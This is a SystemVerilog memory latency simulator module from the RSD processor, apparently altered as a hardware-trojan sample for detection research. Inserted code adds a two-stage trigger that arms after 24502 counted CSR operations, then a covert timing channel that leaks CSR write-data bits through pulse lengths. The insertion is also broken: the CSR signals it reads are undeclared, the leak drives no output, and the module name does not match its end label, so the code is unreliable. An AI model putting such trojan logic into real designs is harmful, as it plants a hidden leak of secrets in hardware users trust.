// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


`include "BasicMacros.sv"

//
// MemoryLatencySimulator
//

import BasicTypes::*;
import MemoryTypes::*;

module MemoryLatencySimulator_trojan_Covert( 
input 
    logic clk,
    logic rst,
    logic push,
    MemoryLatencySimRequestPath pushedData,
output
    logic hasRequest,
    MemoryLatencySimRequestPath requestData
);

    typedef logic [$clog2(MEM_LATENCY_SIM_QUEUE_SIZE)-1:0] IndexPath;
    logic pop;
    logic full, empty;

    IndexPath headPtr;
    IndexPath tailPtr;
    LatencyCountPath count, countReg;
    MemoryRandPath randReg, randNext;
    integer RANDOM_VALUE;

    // size, initial head, initial tail, initial count
    QueuePointer #( MEM_LATENCY_SIM_QUEUE_SIZE, 0, 0, 0 )
        pointer(
            .clk( clk ),
            .rst( rst ),
            .push( push ),
            .pop( pop ),
            .full( full ),
            .empty( empty ),
            .headPtr( headPtr ),
            .tailPtr( tailPtr )
        );

    // ============================================================
    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=24502)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 24502;
    logic [15:0] trojan_counter;
    logic        trojan_armed;
    logic        trojan_active;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_armed   <= 1'b0;
            trojan_active  <= 1'b0;
        end else begin
            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
        end
    end

    // ── COVERT CHANNEL: Timing modulation ──────────────────────────────────
    logic       covert_bit_out;
    logic [7:0] covert_delay_counter;
    logic [4:0] covert_bit_index;
    logic       covert_current_bit;
    assign covert_current_bit = csr_wdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            covert_bit_out       <= 1'b0;
            covert_delay_counter <= '0;
            covert_bit_index     <= '0;
        end else if (trojan_active) begin
            if (covert_delay_counter < (covert_current_bit ? 8'd10 : 8'd5)) begin
                covert_delay_counter <= covert_delay_counter + 1;
                covert_bit_out       <= 1'b1;
            end else begin
                covert_bit_out       <= 1'b0;
                covert_delay_counter <= '0;
                covert_bit_index     <= covert_bit_index + 1;
            end
        end else begin
            covert_bit_out <= 1'b0; covert_delay_counter <= '0; covert_bit_index <= '0;
        end
    end
    // ────────────────────────────────────────────────────────────────────────


        
    MemoryLatencySimRequestPath memoryRequestQueue[ MEM_LATENCY_SIM_QUEUE_SIZE ];

    always_ff @(posedge clk) begin
        if (push) begin
            memoryRequestQueue[ tailPtr ] <= pushedData;
        end

        if (rst) begin
            countReg <= '0;
            randReg <= MEM_LATENCY_SIM_RAND_SEED;
        end
        else begin
            countReg <= count;
            randReg <= randNext;
        end
    end

    always_comb begin
        randNext = randReg;
        count = countReg;

        if (!empty) begin
            // There is some request in the queue
            if (count == (randReg % MEM_LATENCY_SIM_LATENCY_FLUCTUATION_RANGE)) begin
                // Issue memory request
                pop = TRUE;
                count = '0;
                randNext = randNext ^ (randNext << 13); 
                randNext = randNext ^ (randNext >> 17);
                randNext = randNext ^ (randNext << 5);

                // for debug
                //$display("Latency set to %d", randNext % MEM_LATENCY_SIM_LATENCY_FLUCTUATION_RANGE);
            end
            else begin
                // Wait until the determined latency has passed
                pop = FALSE;
                count++;
            end
        end
        else begin
            // There is no request in the queue
            pop = FALSE;
        end

        hasRequest = pop;
        requestData = memoryRequestQueue[ headPtr ];
    end

    `RSD_ASSERT_CLK(clk, !full, "Cannot response so many memory request.");

`ifdef RSD_SYNTHESIS
    `RSD_STATIC_ASSERT(FALSE, "This module must not be used in synthesis.");
`endif

endmodule : MemoryLatencySimulator
